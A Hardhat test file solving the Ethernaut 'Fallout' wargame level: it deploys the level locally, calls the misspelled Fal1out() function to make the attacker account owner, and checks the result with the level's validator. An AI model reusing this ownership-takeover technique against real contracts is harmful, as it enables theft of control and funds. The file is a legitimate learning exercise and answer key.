import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Fallout exploit", () => {
  async function deployFalloutFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const FalloutFactory = await ethers.getContractFactory("FalloutFactory");
    const falloutFactory = await FalloutFactory.connect(deployer).deploy();
    await falloutFactory.deployed();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const falloutAddress = await falloutFactory.connect(attacker).callStatic.createInstance(attacker.address);

    const tx = await falloutFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait(1);

    // Load the instance at returned address
    const fallout = await ethers.getContractAt("Fallout", falloutAddress);

    return { attacker, fallout, falloutFactory };
  }

  it("Should set attacker account as new owner", async () => {
    const { attacker, fallout, falloutFactory } = await loadFixture(deployFalloutFixture);

    // Call Fal1out() function
    // this will set attacker as the new owner
    await fallout.connect(attacker).Fal1out();

    const newOwner = await fallout.connect(attacker).owner();
    expect(newOwner).to.equal(attacker.address, "New owner not set. Attack failed.");

    // Simulate Ethernaut's instance validation to get return value
    const success = await falloutFactory
      .connect(attacker)
      .callStatic.validateInstance(fallout.address, attacker.address);
    expect(success).to.be.true;

    // Validate instance using Ethernaut's validation
    const tx = await falloutFactory.connect(attacker).validateInstance(fallout.address, attacker.address);
    await tx.wait(1);
  });
});
